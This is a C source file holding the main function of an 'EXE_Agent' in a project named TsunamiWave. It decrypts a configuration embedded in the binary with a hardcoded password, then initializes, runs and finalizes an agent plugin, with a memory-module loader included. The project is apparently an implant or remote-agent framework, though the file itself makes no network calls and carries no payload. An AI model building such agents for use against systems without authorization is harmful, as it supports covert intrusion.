#include <windows.h>
#include <stdio.h>

#pragma message( "Compiling with DEBUGGING messages hardcoded in " __FILE__ )
#define _VERBOSE
#define DEBUG_LEVEL DEBUG_VERBOSE
#include "DebugOutput.h"
#include "LIB_Utilities.h"
#include "cJSON.h"
#include "LIB_LoaderMemoryModule.h"
#include "LIB_ManagerBasic.h"

#include "EXE_Agent.h"
#include "LIB_Agent.h"

// Primary TsunamiWave Configuration
CHAR g_Agent_szPackedConfiguration[CONFIGURATION_DEFAULT_BUFSIZE] = CONFIGURATION_DEFAULT_MAGIC_NUMBER;
CHAR g_Agent_szPackedConfigurationPassword[] = CONFIGURATION_DEFAULT_PASSWORD;


DWORD wmain(INT argc, LPCWCHAR argv[], LPCWCHAR envp[])
{
	DWORD	dwErrorCode = ERROR_SUCCESS;
	DWORD	dwTempErrorCode = ERROR_SUCCESS;

	LPBYTE	lpPackedConfigurationBuffer = NULL;
	DWORD	dwPackedConfigurationBufferSize = 0;
	LPBYTE	lpPackedConfigurationPasswordBuffer = NULL;
	DWORD	dwPackedConfigurationPasswordBufferSize = 0;
	CHAR*	szConfigurationJson = NULL;
	DWORD	dwConfigurationJsonSize = 0;
	CHAR*	szNewConfigurationJson = NULL;
	DWORD	dwNewConfigurationJsonSize = 0;

	cJSON*	lpJsonConfiguration = NULL;



	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("EXE_Agent wmain() start"));


			/***************************************************************************
				Decode/decrypt the configuration JSON string from the binary
			***************************************************************************/
			lpPackedConfigurationBuffer = (LPBYTE)g_Agent_szPackedConfiguration;
			dwPackedConfigurationBufferSize = (DWORD)strlen(g_Agent_szPackedConfiguration);
			lpPackedConfigurationPasswordBuffer = (LPBYTE)g_Agent_szPackedConfigurationPassword;
			dwPackedConfigurationPasswordBufferSize = (DWORD)strlen(g_Agent_szPackedConfigurationPassword);

			DBGPRINT(DEBUG_INFO, TEXT("Get the configuration JSON from the binary storage"));
			dwErrorCode = GetConfigurationFromBinary(
				lpPackedConfigurationBuffer,
				dwPackedConfigurationBufferSize,
				lpPackedConfigurationPasswordBuffer,
				dwPackedConfigurationPasswordBufferSize,
				(LPBYTE*)&szConfigurationJson,
				&dwConfigurationJsonSize
			);
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("DecodeDecryptDecompressBuffer( %p, %d, %p, %d, %p, %p ) failed.(%08x)"),
					lpPackedConfigurationBuffer,
					dwPackedConfigurationBufferSize,
					lpPackedConfigurationPasswordBuffer,
					dwPackedConfigurationPasswordBufferSize,
					(LPBYTE*)&szConfigurationJson,
					&dwConfigurationJsonSize,
					dwErrorCode
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwConfigurationJsonSize: %d"), dwConfigurationJsonSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("szConfigurationJson:     %p"), szConfigurationJson);
			//printf("[%s(%d)] szConfigurationJson:\n%s\n", __FILE__, __LINE__, szConfigurationJson);


			/***************************************************************************
				Initialize the Agent plugin
			***************************************************************************/
			DBGPRINT(DEBUG_INFO, TEXT("Initialize the Agent plugin"));
			dwErrorCode = AgentInitialization(
				(LPBYTE)szConfigurationJson,
				dwConfigurationJsonSize,
				(LPBYTE*)(&szNewConfigurationJson),
				&dwNewConfigurationJsonSize
			);
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("AgentInitialization(%p, %d, %p, %p) failed.(%08x)"),
					(LPBYTE)szConfigurationJson,
					dwConfigurationJsonSize,
					(LPBYTE*)(&szNewConfigurationJson),
					&dwNewConfigurationJsonSize,
					dwErrorCode
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwNewConfigurationJsonSize: %d"), dwNewConfigurationJsonSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("szNewConfigurationJson:     %p"), szNewConfigurationJson);
			//printf("[%s(%d)] szNewConfigurationJson:\n%s\n", __FILE__, __LINE__, szNewConfigurationJson);


			/***************************************************************************
				Execute the Agent plugin callback
			***************************************************************************/
			DBGPRINT(DEBUG_INFO, TEXT("Execute the Agent plugin callback"));
			dwErrorCode = AgentCallback(
				NULL,
				0,
				NULL,
				NULL
			);
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("AgentCallback(%p, %d, %p, %p) failed.(%08x)"),
					NULL,
					0,
					NULL,
					NULL,
					dwErrorCode
				);
				__leave;
			}
			DBGPRINT(DEBUG_INFO, TEXT("AgentCallback returned: %d"), dwErrorCode);


		} // end try-finally
		__finally
		{
			// Delete configuration JSON object
			if (NULL != lpJsonConfiguration)
			{
				cJSON_Delete(lpJsonConfiguration);
				lpJsonConfiguration = NULL;
			}
			// Free the configuration string
			if (NULL != szConfigurationJson)
			{
				FREE(szConfigurationJson);
				szConfigurationJson = NULL;
			}



			/***************************************************************************
				Finalize the Agent plugin
			***************************************************************************/
			DBGPRINT(DEBUG_INFO, TEXT("Finalize the Agent plugin"));
			DBGPRINT(
				DEBUG_VERBOSE,
				TEXT("AgentFinalization( %p, %d, %p, %p )"),
				NULL,
				NULL,
				NULL,
				NULL
			);
			dwTempErrorCode = AgentFinalization(
				NULL,
				NULL,
				NULL,
				NULL
			);
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("AgentFinalization( %p, %d, %p, %p ) failed. (%08x)"),
					NULL,
					NULL,
					NULL,
					NULL,
					dwTempErrorCode
				);
				__leave;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("EXE_Agent wmain() end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}
